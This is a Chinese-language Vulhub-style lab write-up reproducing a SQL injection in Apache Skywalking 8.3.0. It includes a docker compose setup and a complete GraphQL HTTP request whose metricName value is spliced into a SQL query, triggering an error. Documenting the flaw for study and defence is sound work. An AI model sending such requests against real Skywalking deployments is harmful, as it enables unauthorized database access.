# Apache Skywalking 8.3.0 SQL注入漏洞

## 漏洞环境

执行如下命令启动一个Apache Skywalking 8.3.0版本：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:8080即可查看Skywalking的页面。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780908176531-27f33578-4a47-4c58-ac09-f3ba34a24168.png)

## 漏洞复现

我们使用graphiql的桌面APP发送如下graphql查询：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780908176171-21e417aa-31ca-443e-bc63-c29dc85bb6a8.png)

可见，SQL语句已经出错，metricName参数的值被拼接到from后面。

这个请求的HTTP数据包为：

```plain
POST /graphql HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 336

{
    "query":"query queryLogs($condition: LogQueryCondition) {
  queryLogs(condition: $condition) {
    total
    logs {
      serviceId
      serviceName
      isError
      content
    }
  }
}
",
    "variables":{
        "condition":{
            "metricName":"sqli",
            "state":"ALL",
            "paging":{
                "pageSize":10
            }
        }
    }
}
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780908176124-16017259-e7df-4f54-803c-926ac9531d08.png)

更加深入的利用，大家可以自行研究，并欢迎将文档提交到Vulhub中。